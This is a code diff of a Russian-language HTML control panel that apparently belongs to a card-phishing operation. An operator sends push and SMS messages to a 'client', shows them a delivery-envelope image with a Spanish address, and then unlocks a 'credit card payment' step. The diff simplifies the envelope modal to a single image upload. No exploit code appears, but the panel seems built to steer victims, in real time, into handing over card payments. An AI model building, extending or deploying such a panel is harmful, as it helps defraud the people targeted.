@@ -73,7 +73,7 @@
               <div class="payment-actions">
                 <button type="button" id="sendPushBtn" data-send-push title="Отправить push-уведомление клиенту">🔔 Пуш</button>
                 <button type="button" id="sendSmsBtn" data-send-sms title="Отправить SMS клиенту">📱 SMS</button>
-                <button type="button" id="envelopeBtn" title="Конверт с адресом клиента">📮 Конверт</button>
+                <button type="button" id="envelopeBtn" title="Загрузить конверт клиента">📮 Конверт</button>
                 <button type="button" id="bankBtn" title="Банк-получатель для переноса кредита (RD2)">🏦 Банк</button>
                 <button type="button" id="debitoBtn" title="Баланс клиента">&#128176; Баланс</button>
                 <button type="button" id="clientDataBtn" title="Все данные клиента на одной странице">&#128203; Данные</button>
@@ -208,18 +208,12 @@
     <div id="envModal" style="display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);align-items:center;justify-content:center">
       <div style="background:#131d2e;border:1px solid #1e2e45;border-radius:14px;padding:26px 24px;width:520px;max-width:94vw;max-height:88vh;overflow-y:auto;display:flex;flex-direction:column;gap:14px;position:relative">
         <button id="envModalClose" type="button" style="position:absolute;top:12px;right:12px;width:28px;height:28px;border-radius:50%;background:#1d2b44;border:1px solid #263654;color:#edf4ff;font-size:16px;display:flex;align-items:center;justify-content:center;cursor:pointer;line-height:1">×</button>
-        <h3 style="margin:0;color:#e2eaf6;font-size:16px;font-weight:700">📮 Конверт с адресом</h3>
-        <div style="display:flex;flex-direction:column;gap:6px"><label style="font-size:12px;color:#7a90aa">Адрес (каждая строка — новая строка на конверте)</label><textarea id="envAddress" rows="3" maxlength="160" placeholder="C. Gral. Ruiz, 62,&#10;Arnedo, 26580" style="background:#0d1421;border:1px solid #1e2e45;border-radius:8px;padding:9px 12px;color:#e2eaf6;font-size:13px;outline:none;width:100%;box-sizing:border-box;resize:vertical;font-family:inherit"></textarea></div>
-        <button id="envGenerateBtn" type="button" style="background:#1166ff;border:none;border-radius:8px;padding:10px;color:#fff;font-size:13px;font-weight:600;cursor:pointer">Сгенерировать</button>
-        <div style="display:flex;align-items:center;gap:10px;color:#5a6b82;font-size:11px"><span style="flex:1;height:1px;background:#263654"></span>или<span style="flex:1;height:1px;background:#263654"></span></div>
+        <h3 style="margin:0;color:#e2eaf6;font-size:16px;font-weight:700">📮 Конверт</h3>
         <input id="envUploadInput" type="file" accept="image/*" style="display:none" />
-        <div style="display:flex;gap:10px">
-          <button id="envUploadBtn" type="button" style="flex:1;background:#1d2b44;border:1px solid #263654;border-radius:8px;padding:10px;color:#edf4ff;font-size:13px;font-weight:600;cursor:pointer">🖼 С ПК</button>
-          <button id="envPasteBtn" type="button" title="Вставить картинку из буфера обмена (или просто Ctrl+V)" style="flex:1;background:#1d2b44;border:1px solid #263654;border-radius:8px;padding:10px;color:#edf4ff;font-size:13px;font-weight:600;cursor:pointer">📋 Из буфера</button>
-        </div>
+        <button id="envUploadBtn" type="button" style="background:#1166ff;border:none;border-radius:8px;padding:10px;color:#fff;font-size:13px;font-weight:600;cursor:pointer">🖼 Загрузить с ПК</button>
         <span id="envResultMsg" style="font-size:12px;min-height:16px;text-align:center;display:block"></span>
         <a id="envPreviewLink" href="#" target="_blank" rel="noopener" style="display:none"><img id="envPreview" src="" alt="Превью конверта" style="width:100%;border-radius:10px;border:1px solid #1e2e45;display:block" /></a>
-        <p id="envConfirmHint" style="display:none;margin:0;font-size:12px;color:#7a90aa;text-align:center">Картинка уже показана клиенту. Проверьте адрес и подтвердите, чтобы открыть отправку оплаты кредитки.</p>
+        <p id="envConfirmHint" style="display:none;margin:0;font-size:12px;color:#7a90aa;text-align:center">Картинка уже показана клиенту. Проверьте её и подтвердите, чтобы открыть отправку оплаты кредитки.</p>
         <button id="envConfirmBtn" type="button" style="display:none;background:#1ea86a;border:none;border-radius:8px;padding:10px;color:#fff;font-size:13px;font-weight:600;cursor:pointer">✓ Подтвердить</button>
       </div>
     </div>
